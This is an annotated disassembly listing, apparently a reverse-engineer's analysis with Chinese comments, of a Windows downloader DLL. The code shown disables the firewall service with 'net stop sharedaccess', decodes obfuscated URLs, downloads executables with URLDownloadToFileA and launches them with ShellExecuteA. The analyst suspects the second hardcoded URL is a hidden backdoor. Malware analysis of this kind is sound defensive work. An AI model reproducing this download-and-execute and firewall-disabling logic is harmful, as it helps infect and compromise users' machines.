
```
.text:100014BF loc_100014BF:                 ; CODE XREF: StartAddress+2F8j

.text:100014BF          test    eax, eax

.text:100014C1          jz      short loc_100014DE

.text:100014C3          push    0           ; lpThreadId

.text:100014C5          push    0           ; dwCreationFlags

.text:100014C7          push    edi         ; lpParameter

.text:100014C8          push    offset sub_100010A0 ; lpStartAddress

.text:100014CD          push    0           ; dwStackSize

.text:100014CF          push    0           ; lpThreadAttributes

.text:100014D1          call    ebx ; CreateThread

.text:100014D3          push    63h         ; dwMilliseconds

.text:100014D5          mov     [ebp+0], eax

.text:100014D8          call    ds:Sleep

.text:100014DE

.text:100014DE loc_100014DE:                ; CODE XREF: StartAddress+301j

.text:100014DE          add     edi, 64h

.text:100014E1          add     ebp, 4

.text:100014E4          cmp     edi, 1000394Ch

.text:100014EA          jl      short loc_1000148F

.text:100014EC          mov     ebx, ds:WaitForSingleObject

.text:100014F2          mov     ebp, ds:CloseHandle

.text:100014F8          lea     edi, [esp+658h+var_604]

.text:100014FC          mov     [esp+658h+var_644], 14h

.text:10001504

.text:10001504 loc_10001504:                 ; CODE XREF: StartAddress+35Ej

.text:10001504          mov     esi, [edi]

.text:10001506          test    esi, esi

.text:10001508          jz      short loc_10001512

.text:1000150A          push    0FFFFFFFFh    ; dwMilliseconds

.text:1000150C          push    esi           ; hHandle

.text:1000150D          call    ebx ; WaitForSingleObject

.text:1000150F          push    esi           ; hObject

.text:10001510          call    ebp ; CloseHandle

.text:10001512

.text:10001512 loc_10001512:                 ; CODE XREF: StartAddress+348j

.text:10001512          mov     eax, [esp+658h+var_644]

.text:10001516          add     edi, 4

.text:10001519          dec     eax

.text:1000151A          mov     [esp+658h+var_644], eax

.text:1000151E          jnz     short loc_10001504

.text:10001520          pop     ebp

.text:10001521

.text:10001521 loc_10001521:                 ; CODE XREF: StartAddress+13Cj

.text:10001521          mov     eax, dword_10003174

.text:10001526          test    eax, eax

.text:10001528          jz      short loc_10001537

.text:1000152A          push    0           ; uCmdShow

.text:1000152C          push    offset CmdLine ; "net stop sharedaccess"

.text:10001531          call    ds:WinExec

.text:10001537

.text:10001537 loc_10001537:                 ; CODE XREF: StartAddress+368j

.text:10001537          mov     ecx, 41h

.text:1000153C          xor     eax, eax

.text:1000153E          lea     edi, [esp+654h+FileName]

.text:10001545          push    104h          ; uSize

.text:1000154A          rep stosd

.text:1000154C          lea     eax, [esp+658h+FileName]

.text:10001553          push    eax           ; lpBuffer

.text:10001554          call    ds:GetWindowsDirectoryA

.text:1000155A          mov     edi, offset aTempIlovexd_ex ; "\\temp\\ilovexd.exe"

.text:1000155F          or      ecx, 0FFFFFFFFh

.text:10001562          xor     eax, eax

.text:10001564          lea     edx, [esp+654h+FileName]

.text:1000156B          repne scasb

.text:1000156D          not     ecx

.text:1000156F          sub     edi, ecx

.text:10001571          push    63h

.text:10001573          mov     esi, edi

.text:10001575          mov     ebx, ecx

.text:10001577          mov     edi, edx

.text:10001579          or      ecx, 0FFFFFFFFh

.text:1000157C          repne scasb

.text:1000157E          mov     ecx, ebx

.text:10001580          dec     edi

.text:10001581          shr     ecx, 2

.text:10001584          rep movsd

.text:10001586          mov     ecx, ebx

.text:10001588          push    offset byte_10003564

.text:1000158D          and     ecx, 3

.text:10001590          rep movsb

.text:10001592          call    URL_Decode    ; url 解密.

.text:10001597          add     esp, 8

.text:1000159A          lea     eax, [esp+654h+FileName]

.text:100015A1          push    0           ; LPBINDSTATUSCALLBACK

.text:100015A3          push    0           ; DWORD

.text:100015A5          push    eax           ; LPCSTR

.text:100015A6          push    offset byte_10003564 ; LPCSTR

.text:100015AB          push    0           ; LPUNKNOWN

.text:100015AD          call    URLDownloadToFileA

.text:100015B2          lea     ecx, [esp+654h+FileName]

.text:100015B9          push    ecx           ; lpFileName

.text:100015BA          call    ds:GetFileAttributesA

.text:100015C0          cmp     eax, 0FFFFFFFFh

.text:100015C3          jnz     short loc_100015DE

.text:100015C5          push    offset aDllDownloadFai ; "dll:download failed... check url.."

.text:100015CA          call    ds:OutputDebugStringA

.text:100015D0          pop     edi

.text:100015D1          pop     esi

.text:100015D2          xor     eax, eax

.text:100015D4          pop     ebx

.text:100015D5          add     esp, 648h

.text:100015DB          retn    4

.text:100015DE ; ---------------------------------------------------------------------------

.text:100015DE

.text:100015DE loc_100015DE:                 ; CODE XREF: StartAddress+403j

.text:100015DE          mov     ebx, ds:ShellExecuteA

.text:100015E4          push    0           ; nShowCmd

.text:100015E6          push    0           ; lpDirectory

.text:100015E8          lea     edx, [esp+65Ch+FileName]

.text:100015EF          push    0           ; lpParameters

.text:100015F1          push    edx           ; lpFile

.text:100015F2          push    offset Operation ; "open"

.text:100015F7          push    0           ; hwnd

.text:100015F9          call    ebx ; ShellExecuteA

.text:100015FB          mov     ecx, 8

.text:10001600          mov     esi, offset a?QG0fccciekl7r ; "?$%\*q}~'()?FCCCK?RI=>N?NR"

.text:10001605          lea     edi, [esp+654h+en_url] ; 这个单独的 url 很奇怪,每个配出来下载者在最后都会去下

.text:10001605                                                ; 载这个地址上的东西并执行(我用 OD 解过这个字符串,是个

.text:10001605                                                ; exe 的地址,不过已经失效). 不知道是用于什么目的的,

.text:10001605                                                ; 更新? 统计? 还是后门 ?因为这些地址全部失效现在也

.text:10001605                                                ; 无法得知了.

.text:10001609          xor     eax, eax

.text:1000160B          rep movsd

.text:1000160D          movsw

.text:1000160F          mov     ecx, 6

.text:10001614          mov     esi, offset aCProgra1Ojhnjk ; "C:\\Progra~1\\OJhnjksLC.exe"

.text:10001619          lea     edi, [esp+654h+save_path.]

.text:10001620          mov     [esp+654h+var_616], eax

.text:10001624          rep movsd

.text:10001626          mov     [esp+654h+var_612], eax

.text:1000162A          mov     ecx, 12h

.text:1000162F          movsw

.text:10001631          mov     [esp+654h+var_60E], eax

.text:10001635          lea     edi, [esp+654h+var_496]

.text:1000163C          mov     [esp+654h+var_60A], eax

.text:10001640          push    57h

.text:10001642          rep stosd

.text:10001644          lea     ecx, [esp+658h+en_url]

.text:10001648          push    ecx

.text:10001649          stosw

.text:1000164B          call    URL_Decode    ; 对作者自己的 url 解密.

.text:10001650          add     esp, 8

.text:10001653          lea     edx, [esp+654h+save_path.]

.text:1000165A          lea     eax, [esp+654h+en_url]

.text:1000165E          push    0           ; LPBINDSTATUSCALLBACK

.text:10001660          push    0           ; DWORD

.text:10001662          push    edx           ; LPCSTR

.text:10001663          push    eax           ; LPCSTR
```
